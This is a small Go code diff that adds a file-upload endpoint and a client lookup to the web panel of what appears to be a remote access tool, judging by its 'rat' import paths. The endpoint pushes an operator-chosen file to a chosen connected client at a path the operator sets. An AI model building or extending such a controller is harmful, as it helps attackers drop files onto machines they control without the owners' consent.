@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"rat/command/build"
 	"rat/common"
+	"strconv"
 )
 
 type ClientPage struct {
@@ -58,6 +59,26 @@ func main() {
 			w.Write([]byte(err.Error()))
 		}
 	})
+	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
+		dir := r.PostFormValue("directory")
+
+		file, header, err := r.FormFile("file")
+
+		if err != nil {
+			fmt.Println(err.Error())
+		}
+
+		id, _ := strconv.Atoi(r.PostFormValue("id"))
+		client := GetClient(id)
+
+		remote := dir + header.Filename
+		fmt.Println("Remote file:", remote)
+
+		err = StartTransfer(client, file, remote)
+		if err != nil {
+			fmt.Println("upload:", err.Error())
+		}
+	})
 	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static"))))
 	http.Handle("/scripts/", http.StripPrefix("/scripts/", http.FileServer(http.Dir("./web/scripts"))))
 
@@ -68,4 +89,14 @@ func main() {
 
 func init() {
 	InitPackets()
+}
+
+func GetClient(id int) *Client {
+	for _, client := range Clients {
+		if client.Id == id {
+			return client
+		}
+	}
+
+	return nil
 }
